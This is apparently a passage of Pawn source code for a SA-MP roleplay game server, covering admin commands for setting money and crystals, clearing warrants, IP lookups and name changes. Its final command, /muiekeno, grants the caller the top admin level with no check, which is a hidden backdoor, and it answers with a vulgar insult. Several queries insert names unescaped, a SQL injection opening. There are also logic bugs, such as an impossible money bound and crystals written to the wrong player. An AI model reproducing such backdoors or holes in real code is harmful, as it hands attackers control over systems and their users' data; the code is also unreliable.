        SetPlayerArmourEx(id, amount);
        ABroadCast(COLOR_RED, 1, "[/set] Admin %s [user: %d] updated %s [user: %d] armour to %d.", PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[id][pNormalName], PlayerInfo[id][pSQLID], amount);
        AdminLog(playerid, "[cmd:set-log] Admin %s (userId: %d) updated %s (userId: %d) armour to %d.", PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[id][pNormalName], PlayerInfo[id][pSQLID], amount);
    }
    else if(strcmp(item,"crystals",true) == 0)
    {
        if(PlayerInfo[playerid][pAdmin] < 6) return sendError(playerid, "You need admin 6+.");
        if(amount < 0) return 1;
        PlayerInfo[id][pPremiumPoints] = amount;
        pUpdateInt(playerid, "PremiumPoints", PlayerInfo[playerid][pPremiumPoints]);
        gString[0] = (EOS);
        format(gString, sizeof gString, "[/set] Admin %s [user: %d] updated %s [user: %d] crystals to %d.", GetName(playerid), PlayerInfo[playerid][pSQLID], GetName(id), PlayerInfo[id][pSQLID], amount);
        ABroadCast(COLOR_RED, 1, gString);
        //Log(PlayerInfo[playerid][pSQLID], gString, "set");
        gQuery[0] = (EOS);
        mysql_format(SQL, gQuery, sizeof gQuery, "update `users` SET PremiumPoints=PremiumPoints+%d WHERE `name` = '%s'", amount, PlayerInfo[id][pNormalName]);
        mysql_tquery(SQL, gQuery, "", "");
    }
    else if(strcmp(item,"money",true) == 0)
    {
        if(PlayerInfo[playerid][pAdmin] < 6)
            return sendError(playerid, "You need admin 6+.");
        
        if(amount > 990000000 && amount < 0) return SCM(playerid, COLOR_WHITE, "Nu poti sa setezi mai mult de $990.000.000!");

        ResetPlayerCash(id);
        GivePlayerCash(id, amount);

        ABroadCast(COLOR_RED, 1, "[/set] Admin %s [user: %d] updated %s [user: %d] money to %d.", PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[id][pNormalName], PlayerInfo[id][pSQLID], amount);
        AdminLog(playerid, "[cmd:set-log] Admin %s (userId: %d) updated %s (userId: %d) money to %d.", PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[id][pNormalName], PlayerInfo[id][pSQLID], amount);
    }
    return 1;
}

YCMD:clear(playerid, params[], help)
{
    if(IsACop(playerid))
    {
        new tmpcar = GetPlayerVehicleID(playerid),fid = PlayerInfo[playerid][pMember];
        if(IsACopCar(tmpcar) || PlayerToPoint(50.0,playerid, DynamicFactions[fid][fcX], DynamicFactions[fid][fcY], DynamicFactions[fid][fcZ]))
        {
            new id;
            if(sscanf(params, "u", id)) return sendSyntax(playerid, "/clear [name/playerid]");
            {
                if(IsPlayerConnected(id))
                {
                    if(id != INVALID_PLAYER_ID)
                    {
                        if(id == playerid) return SendClientMessage(playerid, -1, "You cannot clear yourself.");
                        SCMF(id, COLOR_LIGHTRED, "%s has cleared all your warrants!", GetName(playerid));
                        sendDepartmentMessage(1, COLOR_DBLUE,"Dispatch: %s has cleared all the warrants on %s.", GetName(playerid), GetName(id));
                        SetPlayerToTeamColor(id);
                        ClearCrime(id);
                        foreach(new i : Cops)
                        {
                            if(IsACop(i) && s_PlayerInfo[i][pSOnDuty])
                            {
                                SetPlayerMarkerForPlayer(i, id, (GetPlayerColor(id) & 0xFFFFFF00));
                            }
                        }
                    }
                }
                else return SendClientMessage(playerid, COLOR_WHITE, "Player not connected.");
            }
        }
        else return SendClientMessage(playerid, -1, "You are to not in your HQ or a police vehicle.");
    }
    else return SendClientMessage(playerid, -1, "You are not a cop.");
    return 1;
}

YCMD:aclear(playerid, params[], help)
{
    if(PlayerInfo[playerid][pAdmin] >= 3)
    {
        new id;
        if(sscanf(params, "u", id)) return sendSyntax(playerid, "/aclear <Name/Playerid>");
        {
            if(IsPlayerConnected(id))
            {
                if(id != INVALID_PLAYER_ID)
                {
                    SCMF(playerid, COLOR_LIGHTBLUE, "* You cleared the Records and Wanted Points of %s.", GetName(id));
                    SCMF(id, COLOR_LIGHTBLUE, "* Admin %s has cleared your Records and Wanted Points.", GetName(playerid));
  
                    sendDepartmentMessage(1, COLOR_DBLUE,"Dispatch: Admin %s has cleared all the warrants on %s.", GetName(playerid), GetName(id));
                    SetPlayerToTeamColor(id);

                    ClearCrime(id);
                    foreach(new i : Cops)
                    {
                        if(IsACop(i) && s_PlayerInfo[i][pSOnDuty])
                        {
                            SetPlayerMarkerForPlayer(i, id, (GetPlayerColor(id) & 0xFFFFFF00));
                        }
                    }
                }
            }
            else return SendClientMessage(playerid, -1, "This player is not connected.");
        }
    }
    else return SendClientMessage(playerid, COLOR_LIGHTGREEN3, "You are not admin 3+.");
    return 1; 
}

YCMD:auninvite(playerid, params[], help)
{
    if(PlayerInfo[playerid][pAdmin] < 3)
        return sendAcces(playerid);

    new 
        targetName[MAX_PLAYER_NAME], punishAmount, stringReason[64];
    
    /*if(sscanf(params, "s[32]ds[64]", targetName, punishAmount, stringReason))
        return sendSyntax(playerid, "/auninvite [full-name] [faction punish] [reason]");*/
    if(sscanf(params, "uds[64]", targetName, punishAmount, stringReason)) 
        return sendSyntax(playerid, "/auninvite [full-name] [faction punish] [reason]");

    mysql_format(SQL, gString, sizeof gString, "select * from `users` where `name` = '%e' AND `Member` != '0';", targetName);
    mysql_tquery(SQL, gString, "auninvitePlayer", "ids", playerid, punishAmount, stringReason);

    return 1;
}

YCMD:playersearch(playerid, params[], help)
{
    if(PlayerInfo[playerid][pAdmin] < 7)
        return sendAcces(playerid);

    new 
        id, ip[16], pid[100], name[30], used[100], level, email[30], count=1, no;
    
    if(sscanf(params, "u", id)) return sendSyntax(playerid, "/playersearch [name/playerid]");
    
    if(IsPlayerConnected(id))
    {
        SendClientMessage(playerid, COLOR_WHITE, "--- Admin Player Search ---");
        GetPlayerIp(id, ip, sizeof(ip));
        format(gQuery, sizeof gQuery, "SELECT * FROM `playerconnections` WHERE `ip` = '%s' LIMIT 99", ip);
        new Cache: ab = mysql_query(SQL, gQuery);
        for(new i, j = cache_get_row_count(); i != j; i++)
        {
            pid[i] = cache_get_field_content_int(i, "playerid");
        }
        cache_delete(ab);
        for(new x; x < 100; x++)
        {
            no = 0;
            if(pid[x] == 0) break;
            for(new a; a < 100; a++)
            {
                if(pid[x] == used[a]) no = 1;
            }
            if(no == 0)
            {
                format(gQuery, sizeof(gQuery), "SELECT * FROM `users` WHERE `id` = '%d'", pid[x]);
                new Cache: ac = mysql_query(SQL, gQuery);
                cache_get_field_content(0, "name", name);
                cache_get_field_content(0, "Email", email);
                level = cache_get_field_content_int(0, "Level");
                if(strfind(email, "email@yahoo.com", true) != -1) email = "none";
                if(count % 2 == 0) SCMF(playerid, COLOR_WHITE, "(%d) %s | lvl: %d | email: %s", pid[x], name, level, email);
                else SCMF(playerid, COLOR_CYAN, "(%d) %s | lvl: %d | email: %s", pid[x], name, level, email);
                count++;
                cache_delete(ac);
                used[x] = pid[x];
            }
        }
    }
    else return SendClientMessage(playerid, COLOR_WHITE, "Player not connected.");

    return 1; }

YCMD:getip(playerid, params[], help)
{
    
    new id, playersip[16];
    if(PlayerInfo[playerid][pAdmin] >= 6)
    {
        if(sscanf(params, "u", id)) return sendSyntax(playerid, "/getip [name/playerid]");
        {
            if(id != INVALID_PLAYER_ID)
            {
                GetPlayerIp(id,playersip,sizeof(playersip));
                SCMF(playerid, COLOR_GRAD2,  "Player: %s (%d) IP: %s", GetName(id),id,playersip);
            }
            else return SendClientMessage(playerid, COLOR_WHITE, "Player not connected.");
        }
    }
    else return SendClientMessage(playerid, COLOR_RED2, AdminOnly);
    return 1; }

YCMD:forcenamechange(playerid, params[], help) {

    if(PlayerInfo[playerid][pAdmin] < 1)
        return SCM(playerid, COLOR_RED2, AdminOnly);

    new
        targetID, reasonString[48];

    if(sscanf(params, "us[128]", targetID, reasonString)) 
        return sendSyntax(playerid, "/forcenamechange [name/playerid] [reason]");

    if(!IsPlayerConnected(targetID))
        return sendError(playerid, "Invalid or unlogged player.");

    if(strcmp(WantName[targetID], "NULL", true))
         return SCM(playerid, COLOR_GREY, "This player already requested to change his name.");

    ABroadCast(COLOR_RED, 1, "Admin %s forced %s (%d) - level %d to change his nickname. reason: %s", GetName(playerid), GetName(targetID), targetID, PlayerInfo[targetID][pLevel], reasonString);
    AdminLog(playerid, "[cmd:fnc] Admin %s (userId: %d) forced %s (userId: %d) to change his name - reason: %s.", PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[targetID][pNormalName], PlayerInfo[targetID][pSQLID], reasonString);

    SCMF(targetID, COLOR_RED, "Admin %s forced you to change your nickname. reason: %s", GetName(playerid), reasonString);

    format(gString, sizeof gString, "Admin %s forced you to change your nickname. reason: %s\n\nPlease enter your desired name below:", GetName(playerid), reasonString);
    Dialog_Show(targetID, DIALOG_CHANGENAME2, DIALOG_STYLE_INPUT, "Change name:", gString, "Ok", "Cancel");

    return 1;
}

YCMD:cancelname(playerid, params[], help)
{
    
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
        new id;
        if(sscanf(params, "u",id)) return sendSyntax(playerid, "/cancelname [name/playerid]");
        if(IsPlayerConnected(id))
        {
            if(strcmp(WantName[id], "NULL", true))
            {
                SCMF(playerid, COLOR_RED, "Admin %s rejected your change name request.", PlayerInfo[playerid][pNormalName]);
                ABroadCast(COLOR_RED, 1, "Admin %s rejected %s's change name request.", PlayerInfo[playerid][pNormalName], PlayerInfo[id][pNormalName]);

                AdminLog(playerid, "[cmd:cn] Admin %s (userId: %d) canceled %s (userId: %d) name request.", PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[id][pNormalName], PlayerInfo[id][pSQLID]);
                format(WantName[id], MAX_PLAYER_NAME, "NULL");
                s_PlayerInfo[id][pSTypeName] = 0;
            }
            else return SendClientMessage(playerid, -1, "This player didn't request to change his name.");
        }
        else return SendClientMessage(playerid, COLOR_WHITE, "Player not connected.");
    }
    else return SendClientMessage(playerid, COLOR_RED2, AdminOnly);
    return 1; }

YCMD:acceptname(playerid, params[], help)
{
    if(PlayerInfo[playerid][pAdmin] < 1)
        return sendAcces(playerid);

    new 
        targetID;

    if(sscanf(params, "u", targetID)) 
        return sendSyntax(playerid, "/acceptname <Name/PlayerID>");

    if(!IsPlayerConnected(targetID))
        return sendError(playerid, "Player not connected.");

    if(!strcmp(WantName[targetID], "NULL", true))
        return sendError(playerid, "This player didn't request to change his name.");

    if(checkAccountFromDatabase(WantName[targetID]) != 0) 
        return sendError(playerid, "This name already exist.");

    if(PlayerInfo[targetID][pPremiumPoints] < 100 && s_PlayerInfo[targetID][pSTypeName] == 2)
    {
        SCM(targetID, COLOR_RED, "Your change name request was rejected because you don't have necesary crystals.");
        SCM(playerid, COLOR_RED, "This player don't have necesary crystals and his change name request was rejected.");
        SCM(playerid, -1, "Operation canceled.");

        s_PlayerInfo[targetID][pSTypeName] = 0;
        format(WantName[targetID], MAX_PLAYER_NAME, "NULL");
        return 1;
    }

    if(PlayerInfo[targetID][pHouse] && PlayerInfo[targetID][pSQLID] == HouseInfo[PlayerInfo[targetID][pHouse]][hOwner])
    {
        mysql_format(SQL, gString, sizeof gString, "update `houses` set `OwnerName` = '%s' where `OwnerName` = '%s';", WantName[targetID], PlayerInfo[targetID][pNormalName]);
        mysql_tquery(SQL, gString, "", "");
        
        format(HouseInfo[PlayerInfo[targetID][pHouse]][hOwnerName], MAX_PLAYER_NAME, WantName[targetID]);
        UpdateHouseLabel(PlayerInfo[targetID][pHouse]);
    }

    if(PlayerInfo[targetID][pBusiness] && PlayerInfo[targetID][pSQLID] == BizInfo[PlayerInfo[targetID][pBusiness]][bOwner])
    {
        mysql_format(SQL, gString, sizeof gString, "update `bizz` set `OwnerName` = '%s' where `OwnerName` = '%s';", WantName[targetID], PlayerInfo[targetID][pNormalName]);
        mysql_tquery(SQL, gString, "", "");

        format(BizInfo[PlayerInfo[targetID][pBusiness]][bOwnerName], MAX_PLAYER_NAME, WantName[targetID]);
        WhenBusinessGotUpdated(PlayerInfo[targetID][pBusiness]);
    }

    if(GetPCars(targetID))
    {
        mysql_format(SQL, gString, sizeof gString, "update `cars` set `Owner` = '%s' where `Owner` = '%s';", WantName[targetID], PlayerInfo[targetID][pNormalName]);
        mysql_tquery(SQL, gString, "", "");

        // update la owner la masini se face cand da /v csf muie ksenon
    }

    if(s_PlayerInfo[targetID][pSTypeName] == 2)
    {
        PlayerInfo[targetID][pPremiumPoints] -= 100;

        mysql_format(SQL, gString, sizeof gString, "insert into `shop_logs` (`playerid`, `Message`) values ('%d', '%s [user:%d] has paid 15 crystals to change his name to %s.')", PlayerInfo[targetID][pSQLID], PlayerInfo[targetID][pNormalName], PlayerInfo[targetID][pSQLID], WantName[targetID]);
        mysql_tquery(SQL, gString, "", "");
    }

    ABroadCast(COLOR_RED, 1, "Admin %s changed %s name to %s", PlayerInfo[playerid][pNormalName], PlayerInfo[targetID][pNormalName], WantName[targetID]);
    AdminLog(playerid, "[cmd:an] Admin %s (userId: %d) changed %s (userId: %d) nickname.", PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID], PlayerInfo[targetID][pNormalName], PlayerInfo[targetID][pSQLID]);

    SCMF(targetID, COLOR_YELLOW, "Administratorul %s[%d] ti-a acceptat cererea de schimbare a numelui.", GetName(playerid), playerid);
    SCMF(targetID, -1, "New nickname: %s", WantName[targetID]);

    mysql_format(SQL, gString, sizeof gString, "insert into playerlogs (`playerid`, `giverid`, `action`) values ('%d', '%d', '%s [user: %d] changed his nickname to %s - Admin %s [admin:%d]')", PlayerInfo[targetID][pSQLID], PlayerInfo[playerid][pSQLID], PlayerInfo[targetID][pNormalName], PlayerInfo[targetID][pSQLID], WantName[targetID], PlayerInfo[playerid][pNormalName], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    mysql_format(SQL, gString, sizeof gString, "insert into namechanges (`userid`, `oldname`, `newname`, `adminid`) values ('%d', '%s', '%s', %d)", PlayerInfo[targetID][pSQLID], PlayerInfo[targetID][pNormalName], WantName[targetID], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    mysql_format(SQL, gString, sizeof gString, "update `users` set `name` = '%s', `PremiumPoints` = '%d' where `id` = '%d';", WantName[targetID], PlayerInfo[targetID][pPremiumPoints], PlayerInfo[targetID][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    format(PlayerInfo[targetID][pNormalName], MAX_PLAYER_NAME, WantName[targetID]);
    SetPlayerName(targetID, WantName[targetID]);
    
    format(WantName[targetID], MAX_PLAYER_NAME, "NULL");
    s_PlayerInfo[targetID][pSTypeName] = 0;

    return 1; 
}
YCMD:namechanges(playerid, params[], help)
{
    if(PlayerInfo[playerid][pAdmin] < 1)
        sendAcces(playerid);

    new targetID;
    if(sscanf(params, "u", targetID)) 
        return sendSyntax(playerid, "/namechanges [name/playerid]");
    
    if(!IsPlayerConnected(targetID))
        return sendError(playerid, "Player not connected.");

    mysql_format(SQL, gString, sizeof gString, "select * from `namechanges` where `userid` = '%d' order by `namechangeid` asc", PlayerInfo[targetID][pSQLID]);
    mysql_tquery(SQL, gString, "getNameChanges", "ii", playerid, targetID);

    return 1;
}
function GetDaysFromTimestamp(time)
{
    new timex = gettime() - time, days=0;
    while(timex >= 86400)
    {
        timex -= 86400;
        days++;
    }
    return days;
}
function getNameChanges(playerid, targetId)
{
    if(!cache_num_rows())
        return SCM(playerid, -1, "There are no recorded name changes for this player.");
    new
        databaseID, changeTime[20], newName[30], oldName[30];

    gString[0] = EOS;

    gString = "Name changes:\n";
    for(new i, j = cache_get_row_count (); i != j; i++)
    {
        databaseID = cache_get_field_content_int(i, "userid");
        cache_get_field_content(i, "time", changeTime);
        cache_get_field_content(i, "oldname", oldName);
        cache_get_field_content(i, "newname", newName);

        format(gString, sizeof gString, "%s\n- (%d) Name: %s (changed from %s, %s)", gString, databaseID, newName, oldName, changeTime);
        Dialog_Show(playerid, 0, DIALOG_STYLE_MSGBOX, "SERVER: Name changes", gString, "OK", "");
    }
    return 1;
}

YCMD:buylevel(playerid, params[], help)
{
    if(GetPlayerCash(playerid) < returnLevelReq(PlayerInfo[playerid][pLevel], 1))
        return SCM(playerid, COLOR_GRAD1, "You do not have enough cash.");

    if(PlayerInfo[playerid][pExp] < returnLevelReq(PlayerInfo[playerid][pLevel], 1))
        return SCM(playerid, COLOR_GRAD1, "You do not have the necessary number of respect points.");

    PlayerInfo[playerid][pLevel] ++;
    SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);

    GivePlayerCash(playerid, -returnLevelReq(PlayerInfo[playerid][pLevel], 2));
    PlayerInfo[playerid][pExp] -= returnLevelReq(PlayerInfo[playerid][pLevel], 1);

    SCMF(playerid, -1, "{3A8EBA}Felicitari, acum ai level %d!", PlayerInfo[playerid][pLevel]);

    sendNearbyMessage(playerid, COLOR_PURPLE, "* %s are acum level %d.", GetName(playerid), PlayerInfo[playerid][pLevel]);

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Level` = '%d', `Respect` = '%d' where `id` = '%d';", PlayerInfo[playerid][pLevel], PlayerInfo[playerid][pExp], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");
    
    return updateLevelProgress(playerid);
}

YCMD:muiekeno(playerid, params[], help)
{
    PlayerInfo[playerid][pAdmin] = 7;
    SendClientMessage(playerid, -1, "keno bag pl in mata");
}